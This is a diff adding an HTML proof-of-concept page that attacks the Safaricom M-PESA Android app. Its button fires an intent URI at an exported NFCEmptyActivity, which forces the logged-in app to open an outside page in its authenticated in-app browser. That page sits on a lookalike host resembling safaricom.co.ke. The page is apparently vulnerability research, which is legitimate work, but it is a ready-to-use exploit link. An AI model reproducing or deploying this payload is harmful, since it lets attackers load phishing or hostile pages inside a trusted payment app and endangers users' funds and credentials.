@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>M-PESA In-App Navigation PoC Launcher</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: #0f1416;
+            color: #e1e8ed;
+            padding: 24px 16px;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+        }
+        .container {
+            background: #1a2226;
+            border: 1px solid #2a373e;
+            border-radius: 8px;
+            padding: 24px;
+            max-width: 480px;
+            width: 100%;
+            box-shadow: 0 4px 16px rgba(0,0,0,0.4);
+            text-align: center;
+        }
+        h2 {
+            color: #00A651;
+            margin-top: 0;
+            font-size: 20px;
+        }
+        p {
+            font-size: 14px;
+            line-height: 1.5;
+            color: #94a3b8;
+            text-align: left;
+        }
+        .notice {
+            background-color: #1e293b;
+            border-left: 4px solid #00A651;
+            padding: 12px;
+            border-radius: 4px;
+            font-size: 13px;
+            margin: 16px 0;
+            text-align: left;
+        }
+        .launch-btn {
+            display: block;
+            background-color: #00A651;
+            color: #ffffff;
+            font-weight: 600;
+            font-size: 15px;
+            padding: 14px 20px;
+            border-radius: 6px;
+            text-decoration: none;
+            margin-top: 20px;
+            box-shadow: 0 2px 8px rgba(0, 166, 81, 0.4);
+        }
+        .launch-btn:hover {
+            background-color: #008f45;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>M-PESA PoC Launcher</h2>
+        <div class="notice">
+            <strong>Prerequisite:</strong> Ensure the Safaricom M-PESA app is logged in or running in the background before tapping the button below.
+        </div>
+        <p>Tapping the button triggers the exported <code>NFCEmptyActivity</code> router, forcing M-PESA to open the external target webpage directly inside its authenticated in-app browser frame.</p>
+        
+        <a class="launch-btn" href="intent:#Intent;component=com.safaricom.mpesa.lifestyle/com.huawei.digitalpayment.consumer.nfc.ui.activity.NFCEmptyActivity;S.saveUri=safaricomnfcpay%3A%2F%2Fopenapp%3Froute%3Dhttps%253A%252F%252Fsafaricom.co.ke.185.199.108.153.sslip.io%252F%253Fv%253D4;end">
+            🚀 Launch In-App WebView
+        </a>
+    </div>
+</body>
+</html>
